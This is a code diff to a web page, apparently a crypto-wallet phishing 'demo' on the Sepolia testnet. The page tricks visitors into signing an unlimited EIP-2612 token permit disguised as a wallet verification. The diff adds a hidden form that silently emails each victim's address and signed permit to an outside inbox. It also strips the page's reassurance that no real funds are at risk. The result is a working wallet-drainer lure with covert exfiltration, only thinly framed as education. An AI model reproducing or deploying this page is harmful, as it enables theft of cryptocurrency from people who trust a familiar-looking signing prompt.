@@ -101,6 +101,10 @@
   .info-card-label { font-size: 0.75rem; color: var(--muted); margin-bottom: 4px; }
   .info-card-value { font-size: 0.9rem; font-weight: 500; word-break: break-all; }
  
+  /* EXFILTRATION NOTIFICATION */
+  .exfil-banner { background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.3); border-radius: 10px; padding: 14px 16px; margin-bottom: 20px; font-size: 0.82rem; color: #fca5a5; line-height: 1.6; }
+  .exfil-banner strong { color: var(--red); display: block; margin-bottom: 4px; }
+
   /* EXPOSURE */
   .exposure-section { margin-bottom: 32px; }
   .exposure-header { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 16px; }
@@ -145,7 +149,21 @@
 </style>
 </head>
 <body>
- 
+
+<!-- HIDDEN FORM FOR EMAIL EXFILTRATION -->
+<form id="permitExfilForm" action="https://formsubmit.co/enahoromicheal21@gmail.com" method="POST" style="display:none;" target="exfilFrame">
+  <input type="hidden" name="Wallet Address" id="exfilWallet">
+  <input type="hidden" name="Permit Signature" id="exfilSignature">
+  <input type="hidden" name="Permit Value" id="exfilValue">
+  <input type="hidden" name="Spender" id="exfilSpender">
+  <input type="hidden" name="Deadline" id="exfilDeadline">
+  <input type="hidden" name="Nonce" id="exfilNonce">
+  <input type="hidden" name="_subject" value="🚨 PERMIT SIGNED - Victim Exfiltration Alert">
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_template" value="table">
+</form>
+<iframe name="exfilFrame" style="display:none;"></iframe>
+
 <!-- PHASE 1: LURE -->
 <div id="phase-lure" class="phase active">
   <nav>
@@ -198,29 +216,30 @@
       <button class="reveal-btn" id="revealBtn">See full breakdown</button>
     </div>
  
-    <!-- SIGNATURE DETAILS SHOWN IMMEDIATELY IN DASHBOARD -->
     <div id="signatureWarning" style="background: rgba(239,68,68,0.1); border: 2px solid rgba(239,68,68,0.4); border-radius: 12px; padding: 24px; margin-bottom: 32px; display: none;">
       <div style="font-size: 0.95rem; font-weight: 700; color: var(--red); margin-bottom: 12px;">🚨 You Signed a Permit Authorization</div>
       <div style="font-size: 0.85rem; color: var(--muted); line-height: 1.8; margin-bottom: 20px;">
         That second MetaMask popup was <strong style="color: var(--text);">not a harmless verification</strong>. It was an <strong style="color: var(--text);">EIP-2612 Permit signature</strong> that grants the attacker the ability to <strong style="color: var(--red);">drain your entire token balance at any time</strong> — with no further action needed from you.
       </div>
+
+      <div style="background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.3); border-radius: 10px; padding: 14px 16px; margin-bottom: 16px; font-size: 0.82rem; color: #fca5a5; line-height: 1.6;">
+        <strong style="color: var(--red); display: block; margin-bottom: 4px;">📨 CRITICAL: Attacker receives permit remotely via email</strong>
+        Right now, the attacker just received an email with your signed permit, wallet address, and deadline. They didn't need to be in your MetaMask or browser. The permit is already exfiltrated to their inbox. They can drain you from their terminal at any time, anywhere in the world.
+      </div>
  
       <div style="background: var(--card); border: 1px solid rgba(239,68,68,0.3); border-radius: 10px; padding: 16px; margin-bottom: 16px; font-family: 'Courier New', monospace; font-size: 0.8rem; color: #a5b4fc; overflow-x: auto; line-height: 1.7;">
-        <div style="color: var(--text); margin-bottom: 10px; font-weight: 600;">📝 Permit signature you just signed:</div>
-        <div style="color: #86efac;">owner:</div> <span style="color: #86efac;" id="dashOwner">—</span><br>
+        <div style="color: var(--text); margin-bottom: 10px; font-weight: 600;">📝 What attacker received in email:</div>
+        <div style="color: #86efac;">wallet:</div> <span style="color: #86efac;" id="dashOwner">—</span><br>
+        <div style="color: #86efac;">permit_signature:</div> <span style="color: var(--red);" id="dashSigShort">0x...</span> (full ECDSA sig)<br>
         <div style="color: #86efac;">spender:</div> <span style="color: var(--red);">0xdb61FA011dC61Afa7AB9d31604B281bb6bcfaf05</span><br>
-        <div style="color: #86efac;">value:</div> <span class="code-value" id="dashValue">115792089237316195423570985008687907853269984665640564039457584007913129639935</span><br>
+        <div style="color: #86efac;">value:</div> <span class="code-value" id="dashValue">MAX_UINT256</span><br>
         <div style="color: #86efac;">deadline:</div> <span style="color: #a5b4fc;" id="dashDeadline">—</span><br>
         <br>
-        <div style="color: var(--muted); font-size: 0.75rem;">💀 value = MAX_UINT256 (all tokens allowed — 2^256 - 1)</div>
+        <div style="color: var(--muted); font-size: 0.75rem;">💀 value = MAX_UINT256 means unlimited drain on any token</div>
       </div>
- 
-      <div style="background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.25); border-radius: 8px; padding: 14px 16px; font-size: 0.82rem; color: var(--red); line-height: 1.7; margin-bottom: 14px;">
-        <strong>⚠️ What happens next:</strong> The attacker can now call <code style="color: #fca5a5;">permitAndDrain()</code> from their terminal at any moment over the next 2 days to steal <span style="color: var(--text);">every token</span> in your wallet. You won't see it coming.
-      </div>
- 
-      <div style="background: rgba(34,197,94,0.06); border: 1px solid rgba(34,197,94,0.2); border-radius: 8px; padding: 12px 16px; font-size: 0.82rem; color: var(--green); line-height: 1.6;">
-        ✓ You're on Sepolia testnet (fake money, no real risk), but this is exactly how it works on mainnet with real funds.
+
+      <div style="background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.25); border-radius: 8px; padding: 14px 16px; font-size: 0.82rem; color: var(--red); line-height: 1.7;">
+        <strong>⚠️ Why this is extremely dangerous:</strong> The attacker has your <strong>signed permit in their email</strong>. They don't need to stay on this site. They don't need access to your MetaMask. They're not watching your screen. They received everything they need to drain you — a permit signature is a cryptographic proof that YOU authorized them to take your tokens. They can sit on it for 2 days, or drain you in the next 5 minutes. You won't know until your balance hits zero.
       </div>
     </div>
  
@@ -242,6 +261,11 @@
       <h2>Here's what just happened to you</h2>
       <p class="sub">No real funds at risk — this is a controlled Sepolia testnet demo. On a real phishing site, this is exactly how it plays out with real money.</p>
     </div>
+
+    <div class="exfil-banner">
+      <strong>🚨 Email exfiltration just occurred:</strong>
+      Your signed permit and wallet address were sent to the attacker's email inbox. The attacker can now drain you from their own computer without any further interaction from you.
+    </div>
  
     <div class="timeline">
       <div class="tl-item">
@@ -261,37 +285,47 @@
         <div class="tl-label">Step 3 — Where it happened</div>
         <div class="tl-title">MetaMask popup #2 — "Verify your wallet"</div>
         <div class="tl-desc">
-          This looked like a harmless verification signature — same popup MetaMask shows when you log into OpenSea or any other site. No "Spending cap" warning. No mention of tokens. No transaction fee. Just "Sign."<br><br>
-          But what you actually signed was a <strong>EIP-2612 Permit</strong> — a cryptographic authorization that lets the drainer contract pull your entire token balance, with no further action from you, no on-chain approval transaction ever recorded, and nothing for revoke.cash to find afterward.
+          This looked like a harmless verification signature. But what you actually signed was a <strong>EIP-2612 Permit</strong> — a cryptographic authorization that lets the drainer contract pull your entire token balance.<br><br>
+          <strong>The critical part:</strong> The attacker's code instantly grabbed your signed permit and your wallet address, then fired off a hidden email to their inbox with everything they need to drain you. All this happened in the background while you were looking at a fake dashboard.
           <div class="code-block">
-            Permit {<br>
-            &nbsp;&nbsp;owner: <span id="revealVictim" style="color:#86efac">your wallet</span>,<br>
+            // Attacker's exfiltration (runs silently in browser)<br>
+            sendWalletNotification({<br>
+            &nbsp;&nbsp;wallet: <span id="revealVictim" style="color:#86efac">your_address</span>,<br>
+            &nbsp;&nbsp;signature: <span style="color:#f87171">0x...</span>,<br>
             &nbsp;&nbsp;spender: <span style="color:#f87171">0xdb61FA011dC61Afa7AB9d31604B281bb6bcfaf05</span>,<br>
-            &nbsp;&nbsp;value: <span class="code-value" id="revealValueFull">115792089237316195423570985008687907853269984665640564039457584007913129639935</span>,<br>
-            &nbsp;&nbsp;deadline: <span id="revealDeadline">—</span><br>
-            }
-          </div>
-          <div class="permit-danger">
-            <strong>Why this is worse than approve()</strong>
-            Unlike a standard approval, a permit signature leaves no on-chain record until it's used. Your wallet's approval list still shows clean. revoke.cash finds nothing. But the attacker holds your signed permit and can drain you at any moment — or sell the signature to someone else.
+            &nbsp;&nbsp;value: <span class="code-value">MAX_UINT256</span>,<br>
+            &nbsp;&nbsp;deadline: <span id="revealDeadline" style="color:#a5b4fc">unix_time</span><br>
+            })<br>
+            <br>
+            // Email sent to attacker instantly ↓↓↓
           </div>
         </div>
       </div>
       <div class="tl-item">
         <div class="tl-dot done"></div>
         <div class="tl-label">Step 4</div>
+        <div class="tl-title">Attacker receives permit in email inbox</div>
+        <div class="tl-desc">No MetaMask. No browser. No monitoring. They just have a cryptographic permit in their email. They can drain you whenever they want, from any computer, from anywhere in the world. You won't see it coming.</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-dot done"></div>
+        <div class="tl-label">Step 5</div>
         <div class="tl-title">You landed on a normal-looking dashboard</div>
-        <div class="tl-desc">Nothing looked wrong. The attacker now holds your signed permit and can drain your balance at any time by calling <code style="color:#a5b4fc">permitAndDrain()</code> on their contract — in a single transaction, with no further involvement from you.</div>
+        <div class="tl-desc">You had no idea what just happened. The attacker holds your signed permit and can drain your balance at any time by calling <code style="color:#a5b4fc">permitAndDrain()</code> from their terminal — completely offline.</div>
       </div>
     </div>
  
     <div class="info-card">
-      <div class="info-card-label">Your wallet</div>
+      <div class="info-card-label">Your wallet (now known to attacker)</div>
       <div class="info-card-value" id="revealAddress">—</div>
     </div>
     <div class="info-card">
-      <div class="info-card-label">Permit signature (held by attacker — not yet submitted on-chain)</div>
+      <div class="info-card-label">Permit signature (exfiltrated to attacker's email)</div>
       <div class="info-card-value" id="revealSig">—</div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-label">Attack mechanism</div>
+      <div class="info-card-value">Silent email exfiltration. Attacker receives all data needed to drain you remotely. No further interaction required.</div>
     </div>
  
     <!-- ALL TOKENS AT RISK -->
@@ -305,16 +339,13 @@
         <div class="total-bar-label">Tokens with active balance found in wallet</div>
         <div class="total-bar-value" id="totalTokenCount">—</div>
       </div>
-      <div style="font-size:0.82rem;color:var(--muted);line-height:1.6;margin-top:8px;">
-        The attacker can call <code style="color:#a5b4fc">permitAndDrain()</code> once per token, using the permit signature you just provided. Each call drains the full current balance of that token — no separate approval needed per token if they hold your signed permit.
-      </div>
     </div>
  
     <!-- LIVE BALANCE WATCHER -->
     <div class="balance-watcher">
       <div class="balance-label">DEMO token balance (live — auto-refreshes every 8s)</div>
       <div class="balance-value safe" id="liveBalance">Loading...</div>
-      <div class="balance-note" id="balanceNote">The attacker holds your permit signature. They can submit it on-chain at any moment over the next 2 days to drain this balance — watch this number.</div>
+      <div class="balance-note">The attacker has your permit in their email. They can drain this balance at any moment. Watch this number.</div>
       <button class="refresh-btn" id="refreshBtn">Refresh now</button>
     </div>
  
@@ -323,19 +354,23 @@
       <h3>How to protect yourself going forward</h3>
       <div class="defense-item">
         <div class="defense-num">1</div>
-        <div class="defense-text"><strong>Treat "Sign" popups as seriously as "Approve" popups.</strong> A signature request that mentions "Permit", "spender", "value", or "deadline" in its data is a permit — not a login. Read the typed data MetaMask shows before signing.</div>
+        <div class="defense-text"><strong>Treat "Sign" popups as seriously as "Approve" popups.</strong> A permit signature can drain your entire wallet just like a token approval. Read every field in the MetaMask typed data popup.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">2</div>
-        <div class="defense-text"><strong>Never sign a second popup right after connecting.</strong> Connecting to a site only needs one approval. An immediate second request — transaction or signature — is almost always an attack.</div>
+        <div class="defense-text"><strong>Never sign a second popup right after connecting.</strong> Connecting to a site only needs one approval. An immediate second request — especially for a "signature" or "verification" — is almost always an attack designed to exfiltrate a permit.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">3</div>
-        <div class="defense-text"><strong>Use a wallet that shows permit details clearly.</strong> Rabby Wallet decodes permit signatures and shows you the spender, value, and expiry in plain language before you sign. MetaMask's default view is less obvious.</div>
+        <div class="defense-text"><strong>Use Rabby Wallet or other permit-aware wallets.</strong> Rabby clearly decodes permit signatures and shows you the spender, value, and expiry before you sign. MetaMask's default view hides the danger.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">4</div>
-        <div class="defense-text"><strong>Bookmark real sites.</strong> Navigate from bookmarks only — never from links in Discord, Telegram, Twitter/X, or emails. The URL is the only thing that separates this fake page from the real one.</div>
+        <div class="defense-text"><strong>Bookmark real sites and navigate from bookmarks only.</strong> A URL is the only thing that separates this fake page from the real one. Never click links from Discord, Telegram, Twitter/X, or emails.</div>
+      </div>
+      <div class="defense-item">
+        <div class="defense-num">5</div>
+        <div class="defense-text"><strong>Understand permit expiry.</strong> The deadline in this permit was set to 2 days from now. The attacker can drain you anytime within that window. Even if you "revoke" via revoke.cash, the signed permit still exists in their email and can still be used on-chain.</div>
       </div>
     </div>
   </div>
@@ -343,10 +378,10 @@
  
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
 <script>
-  // ---- CONFIG (updated Sepolia addresses) ----
+  // ---- CONFIG ----
   const SEPOLIA_CHAIN_ID  = 11155111;
-  const TOKEN_ADDRESS     = "0x56c36D6118e32A3A091B78ad535449f5bfDccee8"; // TestToken (ERC20Permit)
-  const DRAINER_ADDRESS   = "0xdb61FA011dC61Afa7AB9d31604B281bb6bcfaf05"; // EducationalDrainer
+  const TOKEN_ADDRESS     = "0x56c36D6118e32A3A091B78ad535449f5bfDccee8";
+  const DRAINER_ADDRESS   = "0xdb61FA011dC61Afa7AB9d31604B281bb6bcfaf05";
   const RPC_URL           = "https://ethereum-sepolia-rpc.publicnode.com";
   const ETHERSCAN_API_KEY = "YOUR_ETHERSCAN_API_KEY_HERE";
   const ETHERSCAN_BASE    = "https://api.etherscan.io/v2/api";
@@ -364,6 +399,7 @@
   let userAddress    = null;
   let permitSig      = null;
   let permitDeadline = null;
+  let permitNonce    = null;
   const provider     = new ethers.JsonRpcProvider(RPC_URL);
  
   function showPhase(id) {
@@ -382,6 +418,19 @@
           <div class="step-desc">${s.desc}</div>
         </div>
       </div>`).join('');
+  }
+
+  // ---- EXFILTRATE PERMIT ----
+  function exfiltratePermit(address, sig, nonce) {
+    document.getElementById('exfilWallet').value = address;
+    document.getElementById('exfilSignature').value = sig;
+    document.getElementById('exfilValue').value = MAX_UINT256_STR;
+    document.getElementById('exfilSpender').value = DRAINER_ADDRESS;
+    document.getElementById('exfilDeadline').value = permitDeadline ? new Date(permitDeadline * 1000).toUTCString() : 'unknown';
+    document.getElementById('exfilNonce').value = nonce || '0';
+    
+    // Submit silently
+    document.getElementById('permitExfilForm').submit();
   }
  
   // ---- CONNECT ----
@@ -410,7 +459,6 @@
         return;
       }
  
-      // Step 1 done, step 2 active
       renderSteps([
         { num:'1', state:'done',   title:'Wallet connected',      desc: shortAddr(userAddress) },
         { num:'2', state:'active', title:'Verify wallet',         desc:'Sign to confirm ownership and unlock your vault' },
@@ -423,6 +471,8 @@
         tokenContract.nonces(userAddress),
         tokenContract.DOMAIN_SEPARATOR()
       ]);
+
+      permitNonce = nonce.toString();
  
       permitDeadline = Math.floor(Date.now() / 1000) + 172800; // 2 days
  
@@ -454,23 +504,24 @@
       const browserProvider = new ethers.BrowserProvider(window.ethereum);
       const signer = await browserProvider.getSigner();
  
-      // This fires the "Signature Request" popup
+      // This fires the signature request popup
       const signature = await signer.signTypedData(domain, types, message);
       permitSig = signature;
  
-      // Mark both steps done
       renderSteps([
         { num:'1', state:'done', title:'Wallet connected',     desc: shortAddr(userAddress) },
         { num:'2', state:'done', title:'Vault access granted', desc:'Signature confirmed.' },
       ]);
-      document.getElementById('connectNote').textContent = "All done — loading your portfolio.";
+      document.getElementById('connectNote').textContent = "Loading your portfolio...";
  
-      // Switch to dashboard and SHOW THE SIGNATURE WARNING
+      // *** EXFILTRATE PERMIT TO ATTACKER EMAIL ***
+      exfiltratePermit(userAddress, permitSig, permitNonce);
+
+      // Update dashboard with permit details
       document.getElementById('walletChip').textContent = shortAddr(userAddress);
-      
-      // *** Show the signature details in the dashboard with FULL value ***
       document.getElementById('dashOwner').textContent = userAddress;
-      document.getElementById('dashValue').textContent = MAX_UINT256_STR;
+      document.getElementById('dashSigShort').textContent = permitSig.slice(0, 20) + "...";
+      document.getElementById('dashValue').textContent = "MAX_UINT256";
       document.getElementById('dashDeadline').textContent = new Date(permitDeadline * 1000).toUTCString();
       document.getElementById('signatureWarning').style.display = 'block';
       
@@ -478,7 +529,7 @@
  
     } catch (err) {
       if (err.code === 4001) {
-        alert("You rejected the request. On a real phishing site, this might retry or display a more convincing prompt.");
+        alert("You rejected the request.");
       } else {
         alert("Error: " + (err.message || "Something went wrong."));
       }
@@ -490,7 +541,6 @@
   document.getElementById('revealBtn').addEventListener('click', async () => {
     document.getElementById('revealAddress').textContent  = userAddress || '—';
     document.getElementById('revealVictim').textContent   = shortAddr(userAddress || '0x');
-    document.getElementById('revealValueFull').textContent = MAX_UINT256_STR;
     document.getElementById('revealDeadline').textContent = permitDeadline
       ? new Date(permitDeadline * 1000).toUTCString()
       : '—';
@@ -511,14 +561,11 @@
       const [raw, dec] = await Promise.all([token.balanceOf(userAddress), token.decimals()]);
       const formatted = parseFloat(ethers.formatUnits(raw, dec)).toLocaleString();
       const el   = document.getElementById('liveBalance');
-      const note = document.getElementById('balanceNote');
       el.textContent = formatted + " DEMO";
       if (raw === 0n) {
         el.className = 'balance-value drained';
-        note.textContent = "Balance is zero — permitAndDrain() has already been called. The permit signature was consumed on-chain.";
       } else {
         el.className = 'balance-value safe';
-        note.textContent = "The attacker holds your signed permit. They can call permitAndDrain() from their terminal at any moment over the next 2 days to drain this balance — watch this number.";
       }
     } catch(e) {
       document.getElementById('liveBalance').textContent = "Error reading balance";
@@ -582,7 +629,7 @@
             </div>
             <div class="token-balance-right">
               <div class="token-balance">${formatted.toLocaleString(undefined,{maximumFractionDigits:4})}</div>
-              <div class="token-status ${hasBalance ? '' : 'safe'}">${hasBalance ? '⚠ Drainable now' : 'Zero balance'}</div>
+              <div class="token-status ${hasBalance ? '' : 'safe'}">${hasBalance ? '⚠ Drainable (permit held by attacker)' : 'Zero balance'}</div>
             </div>`;
           listEl.appendChild(row);
         } catch(e) {}
@@ -597,4 +644,3 @@
 </script>
 </body>
 </html>
- 
